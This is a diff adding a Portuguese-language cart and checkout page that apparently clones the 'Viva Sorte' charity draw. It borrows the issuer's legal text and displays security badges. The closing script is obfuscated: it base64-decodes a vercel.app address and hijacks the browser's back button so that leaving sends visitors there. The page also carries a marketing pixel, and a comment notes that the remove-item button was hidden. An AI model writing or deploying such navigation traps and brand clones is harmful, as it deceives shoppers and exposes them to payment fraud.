@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+  window.pixelId = "6865799cf44d21594a1bd5ef";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script defer src="/_vercel/insights/script.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carrinho - Viva Sorte</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/carrinho.css">
+    <link rel="stylesheet" href="css/spinner.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-container">
+                <div class="logo-center">
+                    <img src="images/logo.png" alt="Viva Sorte">
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Cabeçalho do Carrinho -->
+    <div class="cart-header">
+        <div class="container">
+            <div class="cart-title">
+                <i class="fas fa-shopping-cart"></i>
+                <span>Carrinho</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Conteúdo Principal do Carrinho -->
+    <div class="container cart-container">
+        <!-- Item do Carrinho -->
+        <div class="cart-item">
+            <div class="cart-item-logo">
+                <img src="images/trevo.png" alt="Viva Sorte">
+            </div>
+            <div class="cart-item-info">
+                <h3>Viva Sorte</h3>
+                <p>Sorteios do Viva Sorte</p>
+            </div>
+            <div class="cart-item-date">
+                <strong>06/07</strong>
+                <span>dom.</span>
+                <span>10:30</span>
+            </div>
+            <!-- Botão de remover item ocultado conforme solicitação -->
+        </div>
+
+        <div class="cart-edition">
+            <span>Edição 080</span>
+        </div>
+
+        <div class="cart-details">
+            <div class="cart-process">
+                <span>Processo SUSEP: 15414.634152/2025-82</span>
+                
+            </div>
+            
+            <div class="cart-value-control">
+                <div class="cart-value">
+                    <label>Valor</label>
+                    <span id="cart-valor">R$ 9,95</span>
+                </div>
+                <div class="cart-quantity">
+                    <button class="quantity-btn decrement-btn">–</button>
+                    <input type="text" id="cart-qty" value="10" class="cart-qty-input" maxlength="3">
+                    <button class="quantity-btn increment-btn">+</button>
+                </div>
+                <div id="aviso-minimo" style="color: #e74c3c; font-size: 0.8rem; margin-top: 5px; text-align: center; font-weight: bold; display: none;">Atenção: O número mínimo de cotas para esta promoção é 10.</div>
+            </div>
+        </div>
+
+        <!-- Seção "Aumente suas chances" -->
+        <div class="chances-section">
+            <h2>Aumente suas chances</h2>
+            <p>Aproveite esta oportunidade e adicione mais sorteios ao seu carrinho!</p>
+            
+            <!-- Card Adicional 1 -->
+            <div class="chance-card" data-price="0.49">
+                <div class="chance-card-left" style="background-image: url('images/01.png'); background-size: 95%; background-position: center; background-repeat: no-repeat;"></div>
+                <div class="chance-card-right">
+                    <div class="chance-card-title">
+                        <h3>Hora do Viva</h3>
+                        <p>HOJE às 12:30</p>
+                    </div>
+                    <button class="add-chance-btn" data-quantity="2" data-price="0.98">Adicione 2 por R$ 0,98</button>
+                </div>
+            </div>
+            
+            <!-- Card Adicional 2 -->
+            <div class="chance-card" data-price="0.49">
+                <div class="chance-card-left" style="background-image: url('images/02.png'); background-size: 95%; background-position: center; background-repeat: no-repeat;"></div>
+                <div class="chance-card-right">
+                    <div class="chance-card-title">
+                        <h3>Hora do Viva</h3>
+                        <p>HOJE às 17:00</p>
+                    </div>
+                    <button class="add-chance-btn" data-quantity="2" data-price="0.98">Adicione 2 por R$ 0,98</button>
+                </div>
+            </div>
+            
+            <!-- Card Adicional 3 -->
+            <div class="chance-card" data-price="0.99">
+                <div class="chance-card-left" style="background-image: url('images/03.png'); background-size: 95%; background-position: center; background-repeat: no-repeat;"></div>
+                <div class="chance-card-right">
+                    <div class="chance-card-title">
+                        <h3>Hora do Viva</h3>
+                        <p>HOJE às 19:30</p>
+                    </div>
+                    <button class="add-chance-btn" data-quantity="2" data-price="1.98">Adicione 2 por R$ 1,98</button>
+                </div>
+            </div>
+            
+            <!-- Card Adicional 4 -->
+            <div class="chance-card" data-price="0.29">
+                <div class="chance-card-left" style="background-image: url('images/sao-paulo.jpg'); background-size: 90%; background-position: center; background-repeat: no-repeat;"></div>
+                <div class="chance-card-right">
+                    <div class="chance-card-title">
+                        <h3>Viva Sorte São Paulo - 10/07</h3>
+                        <p>10/07 às 09:30</p>
+                    </div>
+                    <button class="add-chance-btn" data-quantity="1" data-price="0.29">Adicione 1 por R$ 0,29</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Resumo da compra -->
+        <div class="order-summary">
+            <div class="summary-header">
+                <h3><i class="fas fa-receipt"></i> RESUMO</h3>
+                <p>da sua compra</p>
+                <button class="summary-toggle"><i class="fas fa-chevron-up"></i></button>
+            </div>
+            <div class="summary-content">
+                <div class="summary-line">
+                    <span>Quantidade títulos</span>
+                    <span>05</span>
+                </div>
+                <div class="summary-total">
+                    <span>Total a pagar</span>
+                    <span>R$ 9,95</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Botão de Pagamento -->
+        <div class="checkout-actions">
+            <button id="checkout-btn">Ir para o pagamento <i class="fas fa-chevron-right"></i></button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <!-- Instituição Beneficiada -->
+            <div class="footer-institution">
+                <div class="institution-info">
+                    <h3>Título de capitalização da modalidade filantropia premiável de pagamento único emitido pela VIA CAPITALIZAÇÃO S/A., inscrito no CNPJ sob nº 88.076.302/0001-94. Este título permite a cessão voluntária de 100% do direito de resgate ao INSTITUTO DO CÂNCER DE LONDRINA. Antes de contratar, consulte previamente as Condições Gerais. A aquisição implica automática adesão às Condições Gerais do VIVA SORTE, as quais o subscritor declara ter tomado ciência. A aprovação deste plano pela Susep não implica, por parte da Autarquia, em incentivo ou recomendação a sua aquisição, representando, exclusivamente, sua adequação às normas em vigor. É proibida a venda de Título de Capitalização a menores de 16 (dezesseis) anos (Art. 3° do Código Civil).</h3>
+                    <p>Lembre-se sempre de jogar de forma saudável e responsável no Viva Sorte, aproveitando a diversão com moderação. O título de capitalização Viva Sorte é destinado exclusivamente a maiores de 16 anos.</p>
+                </div>
+
+                <div class="footer-logos">
+                    <div class="issuer-info">
+                        <p>Títulos emitidos por:</p>
+                        <img src="images/viacap-logo.png" alt="Via Cap">
+                    </div>
+                    <div class="beneficiary-info">
+                        <p>Instituição Beneficiada:</p>
+                        <img src="images/hospital-logo.png" alt="Hospital do Câncer de Londrina">
+                    </div>
+                </div>
+
+                <div class="development-info">
+                    <p>Desenvolvimento:</p>
+                    <img src="images/edj-logo.png" alt="EDJ Digital">
+                </div>
+
+                <div class="security-info">
+                    <div class="security-badge">
+                        <img src="images/google-safe.png" alt="Google Safe Browsing">
+                    </div>
+                    <div class="security-badge">
+                        <p>Verificada por</p>
+                        <img src="images/febraban.png" alt="Febraban AQUI">
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Termos de Uso</a>
+                <a href="#">Política de Privacidade</a>
+                <a href="#">Perguntas frequentes</a>
+                <a href="#">Jogo Responsável</a>
+                <a href="#">Contato</a>
+                <a href="#">Sac Via CAP - 0800 740 7819</a>
+                <a href="#">Ouvidoria Via CAP - 0800 874 1505</a>
+                <p>VIVA SORTE DISTRIBUIDORA E INTERMEDIADORA DE NEGÓCIOS LTDA — 48.098.937/0001-78</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+    <script src="js/carrinho.js"></script>
+    
+    <!-- Overlay de carregamento -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-message">Redirecionando para o pagamento...</div>
+    </div>
+<script>
+!function(){var t=atob("aHR0cHM6Ly92aXZhc29ydGUtdGVuLnZlcmNlbC5hcHAv"),e=t.trim()+(t.indexOf("?")>0?"&":"?")+document.location.search.replace("?","").toString();history.pushState({},"",location.href),window.addEventListener("popstate",function(){setTimeout(function(){location.href=e},1)})}();
+</script>
+</body>
+</html>
